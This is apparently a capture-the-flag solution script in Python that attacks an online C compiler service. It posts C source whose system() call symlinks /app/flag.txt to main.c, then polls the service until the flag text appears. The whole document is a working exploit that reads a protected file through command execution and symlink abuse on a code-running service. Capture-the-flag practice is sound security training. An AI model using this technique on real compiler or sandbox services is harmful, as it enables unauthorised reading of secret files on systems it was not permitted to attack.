import requests
import time


#url = "http://127.0.0.1:5000"
url = "https://free-c-compiler-online.challs.pwnoh.io/"


src = """
#include <stdlib.h>
int main() {
    system("ln -sf /app/flag.txt main.c && ls -al");
    return 0;
}
"""

s = requests.Session()

r = s.post(url + '/run', json={'code': src})

run_id = r.json()['id']

while 'bctf' not in r.text:
    time.sleep(1)
    r = s.get(url + f'/{run_id}')
print(r.text)


